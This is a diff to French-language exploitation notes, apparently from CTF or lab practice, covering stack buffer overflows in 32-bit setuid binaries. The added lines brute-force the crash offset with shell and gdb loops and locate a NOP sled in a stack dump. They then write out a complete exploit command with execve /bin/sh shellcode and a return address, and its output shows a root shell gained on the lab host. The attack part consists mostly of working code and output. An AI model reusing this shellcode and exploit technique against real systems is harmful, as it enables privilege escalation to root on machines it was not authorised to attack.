@@ -151,6 +151,7 @@ gcc -z execstack
 Detection à la louche de l'overflow en shell
 ````
 $ for i in `seq 500 510`;do echo $i; ./vuln_basic $(python -c "print 'a'*$i;"); done
+$ for i in `seq 10 2000`; do echo $i; /usr/local/bin/chal $(python -c "print 'A'*$i"); if [[ $? != 0 ]]; then break; fi; done;
 ````
 
 Detection fine de la position dans gdb
@@ -165,6 +166,33 @@ Stopped reason: SIGSEGV
 gdb-peda$ x/520x $esp
 ````
 
+Detection en ligne de commande avec gdb
+```
+for i in `seq 362 366`; do echo $i; gdb -batch -ex='run' -args /usr/local/bin/chal $(python -c "print 'A'*$i+'BBBB'"); done; 
+362
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()                  <====================== BBBB ok => 362 offset
+363
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424241 in ?? ()
+364
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424141 in ?? ()
+365
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42414141 in ?? ()
+366
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+```
+
+
+
 On dispose de 512 octets. On va utiliser (512-48) NOP et une payload de 48 octets suivi d'une adresse 1234.
 ````
  run $(python -c 'print "\x90"*(512-48)+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x01\x02\x03\x04";')
@@ -175,12 +203,67 @@ On cherche avec x/520x $esp une adresse dans les nop
 On l'inverse
 "\x50\xfd\xff\xbf" 
 
+En bash:
+```$ gdb -batch -ex='unset env LINES' -ex='unset env COLUMNS' -ex='b 21' -ex='run' -ex='x/300x $esp' -args  /usr/local/bin/chal $(python -c "print '\x90'*(362-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'BBBB'") 
+No symbol table is loaded.  Use the "file" command.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+0xbffff580:	0x00000042	0xbffff614	0xbffff620	0xb7feccca
+0xbffff590:	0x00000002	0xbffff614	0xbffff5b4	0x0804a014
+....
+0xbffff730:	0x00000000	0x7273752f	0x636f6c2f	0x622f6c61
+0xbffff740:	0x632f6e69	0x006c6168	0x90909090	0x90909090
+0xbffff750:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff760:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff770:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff780:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff790:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7a0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7c0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7d0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7e0:	0x90909090	0x90909090	0x90909090	0x90909090  <=== Bonne cible
+0xbffff7f0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff800:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff810:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff820:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff830:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff840:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff850:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff860:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff870:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff880:	0x90909090	0x1feb9090	0x0876895e	0x4688c031
+0xbffff890:	0x0c468907	0xf3890bb0	0x8d084e8d	0x80cd0c56
+0xbffff8a0:	0xd889db31	0xe880cd40	0xffffffdc	0x6e69622f
+0xbffff8b0:	0x4268732f	0x00424242	0x5f474458	0x53534553
+0xbffff8c0:	0x5f4e4f49	0x313d4449	0x45485300	0x2f3d4c4c
+0xbffff8d0:	0x2f6e6962	0x68736162	0x52455400	0x74783d4d
+0xbffff8e0:	0x2d6d7265	0x63363532	0x726f6c6f	0x48535300
+....
+0xbffffa10:	0x303d687a	0x31333b31	0x6c2e2a3a	0x3d616d7a
+0xbffffa20:	0x333b3130	0x2e2a3a31	0x3d7a6c74	0x333b3130
+thrasivoulos@Sneaky:~$ 
+
+=> 0xbffff7e0
+```
+
+
+
 On quitte gdb et on fait en shell
 ````
 ./vuln_basic  $(python -c 'print "\x90"*(512-48)+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x50\xfd\xff\xbf";')
 $ id
 uid=1001(user) gid=1001(user) euid=1000(chall) groups=1001(user)
 ````
+
+````
+$ /usr/local/bin/chal $(python -c "print '\x90'*(362-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\xe0\xf7\xff\xbf'")
+# id
+uid=1000(thrasivoulos) gid=1000(thrasivoulos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)
+````
+
+
 
 </br>
 
@@ -252,6 +335,10 @@ https://github.com/0vercl0k/rp
 
 ## /usr/local/bin/ovrflw
 
+cat   /proc/sys/kernel/randomize_va_space 
+0
+
+
 ASLR: cat /proc/sys/kernel/va_randomize_space => 2 ALSR on
 NX bit: readelf -W -l <bin> 2>/dev/null | grep ‘GNU_STACK’ | grep -q ‘RWE’ 
 Stack not executable
@@ -259,8 +346,9 @@ Stack not executable
 => Ret2LibC
 
 
-```$ for i in `seq 100 120`; do echo $i; /usr/local/bin/ovrflw $(python -c "print 'A'*$i"); done;
-<o echo $i; /usr/local/bin/ovrflw $(python -c "print 'A'*$i"); done;         
+```
+$ for i in `seq 100 120`; do echo $i; /usr/local/bin/ovrflw $(python -c "print 'A'*$i"); done;
+         
 100
 101
 102
